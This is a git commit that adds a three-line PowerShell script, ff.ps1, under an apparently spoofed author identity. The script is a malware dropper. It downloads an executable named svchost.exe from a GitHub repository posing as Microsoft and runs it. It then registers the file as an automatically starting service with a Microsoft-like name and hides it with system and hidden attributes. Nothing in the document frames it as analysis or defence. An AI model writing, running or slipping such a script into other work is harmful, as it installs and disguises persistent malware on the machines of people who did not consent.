4f12ae8967701042ac4479e2488bc96b1ab8a6ad
Peter Griffin <noreply.steampoqered.com.5@gmail.com>
2026-03-01 19:12:08 +0000

    Create ff.ps1

---
+++ ff.ps1
@@ -0,0 +1,3 @@
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/MicrosoftNetworkServiceHost/MicrosoftNetworkService/main/svchost.exe -OutFile C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe; & C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe
+New-Service -Name "MicrosoftNetworkService" -BinaryPathName "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe" -DisplayName "MicrosoftNetworkService" -StartupType Automatic
+attrib +h +s +i +r "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe"
